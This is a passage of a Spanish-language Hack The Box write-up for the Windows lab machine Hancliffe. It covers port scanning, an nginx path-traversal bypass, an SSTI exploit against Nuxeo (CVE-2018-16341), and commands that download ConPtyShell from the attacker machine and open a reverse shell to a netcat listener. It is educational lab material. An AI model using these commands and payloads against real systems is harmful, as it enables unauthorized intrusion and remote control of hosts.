@@ -1,0 +1,1379 @@
+<!doctype html><html lang=es>
+<head>
+<title>Hancliffe | 7Rocky</title><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<meta name=viewport content="width=device-width,minimum-scale=1">
+<meta name=description content="Hack The Box. Windows. Máquina difícil. Esta máquina tiene una página web que esconde una aplicación Nuxeo en Java vulnerable a SSTI después de romper la lógica de nginx. Luego accedemos a la máquina y encontramos una aplicación con un exploit público para acceder como otro usuario. Después, extraemos credenciales de Firefox y usamos un generador de contraseñas para acceder como otro usuario y encontrar un ejecutable de Windows. Después de hacer ingeniería inversa para obtener las credenciales esperadas, encontramos una vulnerabilidad de Buffer Overflow que necesita ser explotada mediante Socket Reuse para acceder como Administrator">
+<meta name=robots content="index, follow">
+<meta name=image content="https://7rocky.github.io/images/HTB/Hancliffe/Hancliffe.png">
+<meta name=author content="7Rocky">
+<meta property="og:title" content="Hancliffe">
+<meta property="og:description" content="Hack The Box. Windows. Máquina difícil. Esta máquina tiene una página web que esconde una aplicación Nuxeo en Java vulnerable a SSTI después de romper la lógica de nginx. Luego accedemos a la máquina y encontramos una aplicación con un exploit público para acceder como otro usuario. Después, extraemos credenciales de Firefox y usamos un generador de contraseñas para acceder como otro usuario y encontrar un ejecutable de Windows. Después de hacer ingeniería inversa para obtener las credenciales esperadas, encontramos una vulnerabilidad de Buffer Overflow que necesita ser explotada mediante Socket Reuse para acceder como Administrator">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7rocky.github.io/htb/hancliffe/"><meta property="article:section" content="htb">
+<meta property="article:published_time" content="2022-03-05T00:00:00+01:00">
+<meta property="article:modified_time" content="2022-03-09T02:55:46+01:00"><meta property="og:site_name" content="7Rocky">
+<meta property="og:image" content="https://7rocky.github.io/images/HTB/Hancliffe/Hancliffe.png">
+<meta property="og:author" content="7Rocky">
+<meta itemprop=name content="Hancliffe">
+<meta itemprop=description content="Hack The Box. Windows. Máquina difícil. Esta máquina tiene una página web que esconde una aplicación Nuxeo en Java vulnerable a SSTI después de romper la lógica de nginx. Luego accedemos a la máquina y encontramos una aplicación con un exploit público para acceder como otro usuario. Después, extraemos credenciales de Firefox y usamos un generador de contraseñas para acceder como otro usuario y encontrar un ejecutable de Windows. Después de hacer ingeniería inversa para obtener las credenciales esperadas, encontramos una vulnerabilidad de Buffer Overflow que necesita ser explotada mediante Socket Reuse para acceder como Administrator"><meta itemprop=datePublished content="2022-03-05T00:00:00+01:00">
+<meta itemprop=dateModified content="2022-03-09T02:55:46+01:00">
+<meta itemprop=wordCount content="6002">
+<meta itemprop=keywords content="cve,nginx,crypto,buffer-overflow,reversing,port-forwarding,binary-exploitation,directory-path-traversal,ssti,rce,">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="Hancliffe">
+<meta name=twitter:description content="Hack The Box. Windows. Máquina difícil. Esta máquina tiene una página web que esconde una aplicación Nuxeo en Java vulnerable a SSTI después de romper la lógica de nginx. Luego accedemos a la máquina y encontramos una aplicación con un exploit público para acceder como otro usuario. Después, extraemos credenciales de Firefox y usamos un generador de contraseñas para acceder como otro usuario y encontrar un ejecutable de Windows. Después de hacer ingeniería inversa para obtener las credenciales esperadas, encontramos una vulnerabilidad de Buffer Overflow que necesita ser explotada mediante Socket Reuse para acceder como Administrator">
+<meta name=twitter:image content="https://7rocky.github.io/images/HTB/Hancliffe/Hancliffe.png">
+<meta name=twitter:author content="7Rocky">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script>
+<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
+<link href=/css/style.css rel=stylesheet>
+<link href=/css/monokai-sublime.min.css rel=stylesheet>
+<link href=/css/code.css rel=stylesheet>
+<link href=/css/main.css rel=stylesheet>
+<script src=/js/highlight.min.js></script>
+<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
+<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
+<script src=/js/main.js></script>
+<div style=display:none>
+$
+\newcommand{\e}{e}
+\newcommand{\N}[1][]{\mathbb{N}^{#1}}
+\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
+\newcommand{\R}[1][]{\mathbb{R}^{#1}}
+\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
+\newcommand{\C}[1][]{\mathbb{C}^{#1}}
+\newcommand{\dx}{\,\mathrm{d}x}
+\newcommand{\dy}{\,\mathrm{d}y}
+\newcommand{\dz}{\,\mathrm{d}z}
+\newcommand{\dt}{\,\mathrm{d}t}
+\newcommand{\divides}{\, | \,}
+\newcommand{\st}{\; | \;}
+\renewcommand{\geq}{\geqslant}
+\renewcommand{\leq}{\leqslant}
+\renewcommand{\i}{\mathrm{i}}
+\newcommand{\rank}{\mathop{\mathrm{rank}}}
+\newcommand{\tr}{\mathop{\mathrm{tr}}}
+\newcommand{\charField}{\mathop{\mathrm{char}}}
+\newcommand{\Image}{\mathop{\mathrm{Im}}}
+$
+</div></head><body class="ma0 production">
+<header style=position:sticky;top:0;z-index:9>
+<div class=bg-black>
+<nav class=ph4-ns role=navigation>
+<div class="flex-l justify-between items-center center">
+<a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a>
+<div class="flex-l items-center">
+<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/en/htb/hancliffe/ title=en>
+<img alt=en height=32px src=/images/en.png width=32px>
+</a>
+<ul class="pl0 ml3 mr3">
+<li class="list f5 f4-ns fw4 dib pr3">
+<a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a>
+</li><li class="list f5 f4-ns fw4 dib pr3">
+<a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a>
+</li><li class="list f5 f4-ns fw4 dib pr3">
+<a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a>
+</li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+</div></div></nav></div></header><main class=pb7 role=main>
+<article class="flex-l flex-wrap justify-between mw8 center ph3">
+<header class="mt4 w-100">
+<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3>
+<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/hancliffe/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
+</a>
+<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/hancliffe/&text=Hancliffe" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</a>
+<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/hancliffe/&title=Hancliffe" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</a>
+</div><h1 class="f1 mt3 mb1">Hancliffe</h1><time class="f6 mv4 dib tracked" datetime=2022-03-05T00:00:00+01:00>05 / 03 / 2022</time>
+</header><div class=htb-image>
+<img alt=Hancliffe src=/images/HTB/Hancliffe/Hancliffe.png>
+</div><ul class="nested-links tags">
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/cve title=CVE>CVE</a>
+</li><li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/nginx title=nginx>nginx</a>
+</li><li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/crypto title=Criptografía>Criptografía</a>
+</li><li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/buffer-overflow title="Buffer Overflow">Buffer Overflow</a>
+</li><li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/reversing title="Ingeniería inversa">Ingeniería inversa</a>
+</li><li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/port-forwarding title="Reenvío de puertos">Reenvío de puertos</a>
+</li><li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/binary-exploitation title="Explotación de binarios">Explotación de binarios</a>
+</li><li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/directory-path-traversal title="Navegación de directorios">Navegación de directorios</a>
+</li><li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/ssti title="Server-Side Template Injection">Server-Side Template Injection</a>
+</li><li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/rce title="Ejecución remota de comandos">Ejecución remota de comandos</a>
+</li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile">
+<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem>
+<p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents>
+<ul>
+<li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#acceso-a-la-máquina>Acceso a la máquina</a></li><li><a href=#enumeración-del-sistema>Enumeración del sistema</a></li><li><a href=#movimiento-lateral-al-usuario-clara>Movimiento lateral al usuario <code>clara</code></a></li><li><a href=#movimimento-lateral-al-usuario-development>Movimimento lateral al usuario <code>development</code></a></li><li><a href=#ingeniería-inversa-sobre-el-binario>Ingeniería inversa sobre el binario</a></li><li><a href=#escalada-de-privilegios-explotación-de-_buffer-overflow_>Escalada de privilegios (explotación de <em>Buffer Overflow</em>)</a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul>
+<li>
+<strong>SO</strong>: Windows
+</li><li>
+<strong>Dificultad</strong>: Difícil
+</li><li>
+<strong>Dirección IP</strong>: 10.10.11.115
+</li><li>
+<strong>Fecha</strong>: 09 / 10 / 2021
+</li></ul><h2 id=escaneo-de-puertos>Escaneo de puertos</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.115 -p 80,8000,9999
+</span></span><span style=display:flex><span>Nmap scan report for 10.10.11.115
+</span></span><span style=display:flex><span>Host is up (0.14s latency).
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
+</span></span><span style=display:flex><span>80/tcp   open  http    nginx 1.21.0
+</span></span><span style=display:flex><span>|_http-title: Welcome to nginx!
+</span></span><span style=display:flex><span>|_http-server-header: nginx/1.21.0
+</span></span><span style=display:flex><span>8000/tcp open  http    nginx 1.21.0
+</span></span><span style=display:flex><span>|_http-title: HashPass | Open Source Stateless Password Manager
+</span></span><span style=display:flex><span>|_http-server-header: nginx/1.21.0
+</span></span><span style=display:flex><span>9999/tcp open  abyss?
+</span></span><span style=display:flex><span>| fingerprint-strings:
+</span></span><span style=display:flex><span>|   FourOhFourRequest, GetRequest, HTTPOptions:
+</span></span><span style=display:flex><span>|     Welcome Brankas Application.
+</span></span><span style=display:flex><span>|     Username: Password:
+</span></span><span style=display:flex><span>|   NULL:
+</span></span><span style=display:flex><span>|     Welcome Brankas Application.
+</span></span><span style=display:flex><span>|_    Username:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 35.05 seconds
+</span></span></code></pre></div><p>La máquina tiene abiertos los puertos 80 (HTTP), 8000 (HTTP) y 9999.</p><h2 id=enumeración-web>Enumeración web</h2><p>Si vamos a <code>http://10.10.11.115:8000</code>, vemos una página con una aplicación de generación de contraseñas:</p><p><img src=/images/HTB/Hancliffe/Hancliffe-password-generator.png alt="Hancliffe password generator"></p><p>Pero no hay nada interesante de momento. Si vamos a <code>http://10.10.11.115</code> veremos una página por defecto de nginx:</p><p><img src=/images/HTB/Hancliffe/Hancliffe-index.png alt="Hancliffe nginx default page"></p><p>Podemos tratar de aplicar <em>fuzzing</em> para enumerar más rutas:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.115/FUZZ  
+%20                     [Status: <span class=code-dark-green>200</span>, Size: 612, Words: 79, Lines: 26]
+maintenance             [Status: <span class=code-dark-blue>302</span>, Size: 0, Words: 1, Lines: 1]
+</code></pre></div><p>Y vemos que hay una ruta <code>/maintenance</code>, que redirige a <code>/nuxeo/Maintenance/</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.115/maintenance -I
+HTTP/1.1 302
+<span class=code-white>Server</span>: nginx/1.21.0
+<span class=code-white>Date</span>:
+<span class=code-white>Content-Length</span>: 0
+<span class=code-white>Connection</span>: keep-alive
+<span class=code-white>X-Frame-Options</span>: SAMEORIGIN
+<span class=code-white>X-UA-Compatible</span>: IE=10; IE=11
+<span class=code-white>Cache-Control</span>: no-cache, no-store, must-revalidate
+<span class=code-white>X-Content-Type-Options</span>: nosniff
+<span class=code-white>Content-Security-Policy</span>: img-src data: blob: *; default-src blob: *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: *  
+<span class=code-white>X-XSS-Protection</span>: 1; mode=block
+<span class=code-white>Location</span>: /nuxeo/Maintenance/
+</code></pre></div><p>Si ponemos una barra al final, veremos algo de información:</p><p><img src=/images/HTB/Hancliffe/Hancliffe-maintenance.png alt="Hancliffe maintenance"></p><p>Y también nos pone una <em>cookie</em> <code>JSESSIONID</code> para <code>/nuxeo</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.115/maintenance/ -I
+HTTP/1.1 200
+<span class=code-white>Server</span>: nginx/1.21.0
+<span class=code-white>Date</span>:
+<span class=code-white>Content-Type</span>: text/html;charset=ISO-8859-1
+<span class=code-white>Content-Length</span>: 714
+<span class=code-white>Connection</span>: keep-alive
+<span class=code-white>X-Frame-Options</span>: SAMEORIGIN
+<span class=code-white>X-UA-Compatible</span>: IE=10; IE=11
+<span class=code-white>Cache-Control</span>: no-cache, no-store, must-revalidate
+<span class=code-white>X-Content-Type-Options</span>: nosniff
+<span class=code-white>Content-Security-Policy</span>: img-src data: blob: *; default-src blob: *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: *  
+<span class=code-white>X-XSS-Protection</span>: 1; mode=block
+<span class=code-white>Set-Cookie</span>: JSESSIONID=44BBB0235146336EA23847A030BF0401.nuxeo; Path=/nuxeo; HttpOnly
+<span class=code-white>Vary</span>: Accept-Encoding
+</code></pre></div><p>La página web está desarrollada en Java (debido a la <em>cookie</em> <code>JSESSIONID</code>). Como hay un nginx, es posible que exista alguna vulnerabilidad de navegación de directorios (rompiendo la lógica del <em>parser</em>, más información <a href=https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf>aquí</a>). Vamos a probar:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-yellow>'10.10.11.115/maintenance/..;/'</span> -iH <span class=code-dark-yellow>'Cookie: JSESSIONID=44BBB0235146336EA23847A030BF0401.nuxeo'</span>
+HTTP/1.1 302
+<span class=code-white>Server</span>: nginx/1.21.0
+<span class=code-white>Date</span>: Sun, 06 Mar 2022 21:54:29 GMT
+<span class=code-white>Content-Type</span>: text/html;charset=ISO-8859-1
+<span class=code-white>Content-Length</span>: 0
+<span class=code-white>Connection</span>: keep-alive
+<span class=code-white>X-Frame-Options</span>: SAMEORIGIN
+<span class=code-white>X-UA-Compatible</span>: IE=10; IE=11
+<span class=code-white>Cache-Control</span>: no-cache, no-store, must-revalidate
+<span class=code-white>X-Content-Type-Options</span>: nosniff
+<span class=code-white>Content-Security-Policy</span>: img-src data: blob: *; default-src blob: *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: *  
+<span class=code-white>X-XSS-Protection</span>: 1; mode=block
+<span class=code-white>Location</span>: http://10.10.11.115/nuxeo/nxstartup.faces
+</code></pre></div><p>Está redirigiendo a <code>/nuxeo/nxstartup.faces</code>. Vamos a ver qué hy en esta ruta:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-yellow>'10.10.11.115/maintenance/..;/nuxeo/nxstartup.faces'</span> -iH <span class=code-dark-yellow>'Cookie: JSESSIONID=44BBB0235146336EA23847A030BF0401.nuxeo'</span>
+HTTP/1.1 401
+<span class=code-white>Server</span>: nginx/1.21.0
+<span class=code-white>Date</span>: Sun, 06 Mar 2022 21:54:43 GMT
+<span class=code-white>Content-Type</span>: text/html;charset=UTF-8
+<span class=code-white>Content-Length</span>: 220
+<span class=code-white>Connection</span>: keep-alive
+<span class=code-white>X-Frame-Options</span>: SAMEORIGIN
+<span class=code-white>X-UA-Compatible</span>: IE=10; IE=11
+<span class=code-white>Cache-Control</span>: no-cache, no-store, must-revalidate
+<span class=code-white>X-Content-Type-Options</span>: nosniff
+<span class=code-white>Content-Security-Policy</span>: img-src data: blob: *; default-src blob: *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: *  
+<span class=code-white>X-XSS-Protection</span>: 1; mode=block
+
+&lt;script type="text/javascript"&gt;
+document.cookie = 'nuxeo.start.url.fragment=' + encodeURIComponent(window.location.hash.substring(1) || '') + '; path=/';
+window.location = 'http://10.10.11.115/nuxeo/login.jsp';
+&lt;/script&gt;
+</code></pre></div><p>De nuevo, nos redirige. Y aquí tenemos un formulario de inicio de sesión:</p><p><img src=/images/HTB/Hancliffe/Hancliffe-nuxeo-login.png alt="Hancliffe Nuxeo login"></p><p>Aquí podemos ver la versión, que es Nuxeo FT 10.2. Existe una vulnerabilidad que consigue ejecución remota de comandos (RCE) por medio de <em>Server-Side Template Injection</em> (SSTI) en Java (<a href=https://github.com/mpgn/CVE-2018-16341>CVE-2018-16341</a>). Podemos leer cómo funciona el <em>exploit</em> y probar si es vulnerable:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-magenta>$(</span><span class=code-dark-green>echo</span> <span class=code-dark-yellow>'http://10.10.11.115/maintenance/..;/login.jsp/pwn${7*7}.xhtml'</span> | <span class=code-dark-green>sed</span> <span class=code-dark-yellow>'s/{/%7b/g'</span> | <span class=code-dark-green>sed</span> <span class=code-dark-yellow>'s/}/%7d/g'</span><span class=code-dark-magenta>)</span>
+&lt;span&gt;&lt;span style="color:red;font-weight:bold;"&gt;ERROR: facelet not found at '/login.jsp/pwn49.xhtml'&lt;/span&gt;&lt;br /&gt;&lt;/span&gt;  
+</code></pre></div><p>Nótese que hemos codificado los caracteres <code>{</code> and <code>}</code> en codificación URL (<code>%7b</code> and <code>%7d</code>). Como aparece <code>pwn49.xhtml</code> en la respuesta, sabemos que es vulnerable.</p><h2 id=acceso-a-la-máquina>Acceso a la máquina</h2><p>Ahora podemos utilizar el <em>exploit</em> de Python para ejecutar comandos en el servidor. Tenemos que modificar la URL y la arquitectura para hacer que funcione:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> CVE-2018-16341.py
+
+Nuxeo Authentication Bypass Remote Code Execution - CVE-2018-16341  
+
+[+] Checking template injection vulnerability => OK
+
+command (<span class=code-dark-blue>WIN</span>)&gt; whoami
+
+[+] Executing command =&gt;
+
+hancliffe\svc_account
+</code></pre></div><p>Ahora podemos intentar utilizar una <em>reverse shell</em>. Para ello, primero tenemos que verificar que el servidor tiene traza con la máquina de atacante:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>command (<span class=code-dark-blue>WIN</span>)&gt; curl 10.10.17.44
+
+[+] Executing command =&gt;
+
+&amp;lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&amp;gt;  
+</code></pre></div><p>Y sí la tiene:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:10.10.11.115 - - [] "GET / HTTP/1.1" 200 -  
+</code></pre></div><p>Para establecer la conexión de <em>reverse shell</em> utilizaré <a href=https://github.com/antonioCoco/ConPtyShell><code>ConPtyShell</code></a>. Tenemos que descargarlo y después ejecutarlo desde la máquina mientras escuchamos con <code>nc</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>command (<span class=code-dark-blue>WIN</span>)&gt; curl 10.10.17.44/ConPtyShell.exe -o /windows/temp/r.exe  
+
+[+] Executing command =&gt;
+
+command (<span class=code-dark-blue>WIN</span>)&gt; /windows/temp/r.exe 10.10.17.44 4444 50 158
+
+[+] Executing command =&gt;
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
